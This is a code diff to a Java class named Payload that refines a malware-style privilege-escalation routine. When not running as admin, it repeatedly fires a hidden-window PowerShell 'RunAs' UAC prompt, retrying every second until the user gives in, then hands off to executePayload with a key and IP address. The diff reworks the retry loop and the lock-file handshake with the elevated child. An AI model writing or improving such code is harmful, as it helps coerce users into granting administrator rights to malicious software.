@@ -30,13 +30,15 @@ public class Payload {
 
             if (!isAdmin()) {
                 log("Not admin. Starting UAC loop...");
-                // Simple loop: keep asking until accepted
-                while (!askForAdmin(key, ip)) {
+                while (true) {
+                    boolean accepted = askForAdmin(key, ip);
+                    if (accepted) {
+                        log("UAC Accepted. Parent exiting.");
+                        System.exit(0);
+                    }
                     log("UAC Denied. Waiting 1s before retrying...");
                     Thread.sleep(1000);
                 }
-                log("UAC Accepted. Parent exiting.");
-                System.exit(0);
             } else {
                 log("We are Admin! Proceeding.");
                 executePayload(key, ip);
@@ -53,8 +55,8 @@ public class Payload {
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             File lockFile = new File(getLoaderDir(), ".lock");
 
-            // Create the lock file BEFORE asking for admin
-            FileOutputStream lockStream = new FileOutputStream(lockFile);
+            // FIX: Create the file and close it immediately so the child can delete it
+            lockFile.createNewFile();
 
             String psCommand = String.format(
                 "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
@@ -63,22 +65,18 @@ public class Payload {
 
             log("Triggering UAC via PowerShell...");
             Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
-            
-            // Wait for PowerShell to close (which happens when you click Yes or No)
             p.waitFor();
             
             // Give the elevated process up to 10 seconds to start up and delete the lock file
-            log("Checking if elevated process started...");
+            log("Waiting for elevated process...");
             for (int i = 0; i < 100; i++) {
                 if (!lockFile.exists()) {
-                    lockStream.close();
                     return true; // Lock deleted = elevated process is running
                 }
                 Thread.sleep(100); // Check every 100ms
             }
             
             // If we get here, the lock file still exists after 10 seconds (User clicked No)
-            lockStream.close();
             if (lockFile.exists()) lockFile.delete();
             return false;
         } catch (Exception e) {
